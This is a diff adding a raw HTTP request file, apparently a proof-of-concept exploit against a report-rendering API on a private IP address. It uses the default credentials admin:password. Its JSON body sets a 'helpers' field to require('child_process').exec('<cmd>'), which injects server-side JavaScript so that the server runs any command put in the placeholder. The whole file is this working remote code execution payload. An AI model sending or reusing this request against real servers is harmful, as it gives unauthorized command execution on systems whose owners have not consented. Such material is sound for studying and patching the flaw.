@@ -1,0 +1,12 @@
+POST /api/report HTTP/1.1
+Host: 172.16.122.116
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Length: 232
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4280.88 Safari/537.36
+Content-type: application/json
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"template": { "content" : "Hello world", "recipe": "chrome-pdf", "engine": "handlebars","chrome": {"landscape": true },"helpers":"require('child_process').exec('<cmd>');"},"data" :{} }
